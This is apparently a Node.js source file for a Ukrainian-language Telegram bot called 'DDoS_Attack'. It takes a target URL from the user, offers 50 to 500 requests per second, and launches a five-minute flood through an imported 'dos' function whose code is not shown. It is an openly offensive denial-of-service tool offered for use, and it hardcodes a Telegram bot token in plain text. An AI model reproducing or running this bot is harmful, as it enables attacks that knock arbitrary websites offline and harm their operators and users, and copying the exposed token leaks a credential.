let TelegramBot = require('node-telegram-bot-api');
let TOKEN = '5147519741:AAGzpTdTYKjo3YaLgBP6BDVE5IWZcgb-QXI';
let bot = new TelegramBot(TOKEN, {
    polling: true
});

function addZeroToNumber(num) {
    if (num <= 9) {
        return '0' + num;
    } else return num;
}

let mainKeyboard = {
    "reply_markup": {
        hide_keyboard: false,
        "keyboard": [
            ["♿️ Задудосити ♿️"]
        ]
    },
    parse_mode: 'HTML'
};
let requestsCount = {
    "reply_markup": {
        hide_keyboard: false,
        "keyboard": [
            ["➡️ 50"],
            ["➡️ 100"],
            ["➡️ 150"],
            ["➡️ 200"],
            ["➡️ 250"],
            ["➡️ 500"]
        ]
    }
};

let active_process = false;
let link = "";
const ATTACK_INTERVAL = 1000;
const urlRegex = /^(?:http(s)?:\/\/)?[\w.-]+(?:\.[\w\.-]+)+[\w\-\._~:/?#[\]@!\$&'\(\)\*\+,;=.]+$/gm;

const dos = require('./functions');

bot.on('message', (msg) => {
    const chatID = msg.chat.id;
    if (active_process) {
        bot.sendMessage(chatID, "🔄 Атака в процесі, дочекайтеся закінчення...");
        return;
    }
    if (msg.text == "/start") {
        bot.sendMessage(chatID, `🇺🇦Доброго дня!🇺🇦\n\nВас вітає <b>DDoS_Attack</b> бот 🤖!\n\n❗️Для того, щоб розпочати атаку, оберіть пункт меню <b>"♿️ Задудосити ♿️"</b>`, mainKeyboard);
    }
    if (msg.text == "♿️ Задудосити ♿️") {
        bot.sendMessage(chatID, "Надішліть посилання на ресурс", {
            reply_markup: JSON.stringify({
                remove_keyboard: true
            })
        });
    }
    if (urlRegex.test(msg.text) && !active_process) {
        link = msg.text;
        bot.sendMessage(chatID, `Посилання на ресурс: ${link}`, {
            disable_web_page_preview: true
        });
        bot.sendMessage(chatID, "Оберіть кількість атак (запитів) в секунду", requestsCount);
    }
    if (/^➡️/g.test(msg.text) && !active_process) {
        bot.sendMessage(chatID, `Кількість запитів: <i>${msg.text.replace("➡️ ", "")}</i>`, {
            parse_mode: 'HTML'
        });
        let deadline = new Date(new Date().getTime() + (60000*5));
        bot.sendMessage(chatID, `🚀 <b>Починаю DDoS на 5 хвилин</b>\nКінець процедури в <i>${addZeroToNumber(deadline.getHours())}:${addZeroToNumber(deadline.getMinutes())}</i>`, {
            reply_markup: JSON.stringify({
                remove_keyboard: true
            }),
            parse_mode: 'HTML'
        });
        active_process = true;
        dos(link, parseInt(msg.text.replace("➡️ ", "")), ATTACK_INTERVAL, deadline, bot, chatID);
        let check_deadline = setInterval(() => {
            if (new Date().getTime() >= deadline) {
                setTimeout(() => {
                    bot.sendMessage(chatID, "✅ <b>DDoS завершено</b> ✅\n\nДякуємо що обрали нас 🤗!", mainKeyboard);
                }, 500);
                active_process = false;
                link = "";
                clearInterval(check_deadline);
            }
        }, 1000);
    }
});